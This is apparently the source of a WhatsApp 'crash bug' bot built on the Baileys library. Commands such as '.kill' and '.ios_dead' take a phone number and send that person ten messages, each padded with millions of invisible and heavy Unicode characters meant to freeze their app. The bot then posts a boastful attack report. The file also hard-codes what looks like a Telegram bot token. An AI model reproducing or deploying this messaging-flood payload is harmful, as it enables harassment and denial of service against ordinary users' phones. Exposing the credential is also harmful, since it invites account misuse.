const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";
const AD_IMAGE_URL = "https://telegra.ph/file/a8a183d25667e41793741.jpg";

let botConfig = {
    botName: "NEXUS-MD V3 3M SUPREME",
    owner: "94767475809", 
    prefix: ".",
};

app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "110.0.5481.178"], 
        printQRInTerminal: false,
        syncFullHistory: false
    });

    // --- 📩 MESSAGE HANDLER (DEADLY BUG + REPORT) ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const isOwner = mek.key.fromMe || from.startsWith(botConfig.owner);
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
            const targetJid = targetNum + "@s.whatsapp.net";

            // 🔥 DEADLY 3M INVISIBLE BUG PAYLOAD (This freezes the UI)
            const deadlyBug = "☠️ *NEXUS 3M SUPREME CRASH* ☠️\n" + 
                              Buffer.from("Z3VtbWF0YQ==", "base64").toString() + 
                              "​".repeat(1000000) + // Zero-width space (invisible weight)
                              "ꦿ".repeat(500000) + 
                              "᥋".repeat(500000);

            if (command === 'menu' || command === 'bug') {
                const menu = `╭─────〔 *NEXUS 3M SUPREME* 〕─────┈\n│\n│ 🦠 *POWER:* \`3,000,000+\` Char\n│ ⚡ *STATUS:* _Master Private_\n│\n├─────────────┈\n│ ☠️ \`.vid_crash\` [num]\n│ 🔥 \`.ios_dead\` [num]\n│ 💀 \`.kill\` [num]\n│ 🌌 \`.the_end\` [num]\n╰─────────────┈\n 👑 DEV: SASIYA MD`;
                await sock.sendMessage(from, { text: menu, contextInfo: { externalAdReply: { title: "NEXUS 3M ACTIVE ⚡", thumbnailUrl: AD_IMAGE_URL, sourceUrl: CHANNEL_URL }}}, { quoted: mek });
            }

            if (['kill', 'vid_crash', 'the_end', 'ios_dead'].includes(command)) {
                if (!targetNum) return sock.sendMessage(from, { text: "❌ Number එක ගහපන් මචං!" });

                await sock.sendMessage(from, { text: `🌑 *ATTACKING:* ${targetNum}\n*POWER:* 3,000,000+ Characters (Invisible Mode)...` });

                // 🔥 HIGH INTENSITY BURST (This is where it hits hard)
                for(let i=0; i<10; i++) {
                    await sock.sendMessage(targetJid, { text: deadlyBug });
                    await delay(300);
                }

                // 🔥 SUCCESS REPORT
                const report = `╭───〔 *NEXUS ATTACK REPORT* 〕───┈\n│\n│ ✅ *STATUS:* 3M POWER DEPLOYED\n│ 🎯 *TARGET:* ${targetNum}\n│ 🦠 *LOAD:* Invisible UI Freeze\n│ 🕒 *TIME:* ${new Date().toLocaleTimeString()}\n╰─────────────┈\n 👑 *DEV:* SASIYA MD`;
                await sock.sendMessage(from, { text: report, contextInfo: { externalAdReply: { title: "BUG DEPLOYED SUCCESSFULLY 💀", body: "Target: " + targetNum, thumbnailUrl: AD_IMAGE_URL, sourceUrl: CHANNEL_URL }}}, { quoted: mek });
            }

        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => { if (up.connection === 'close') startNexus(); });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
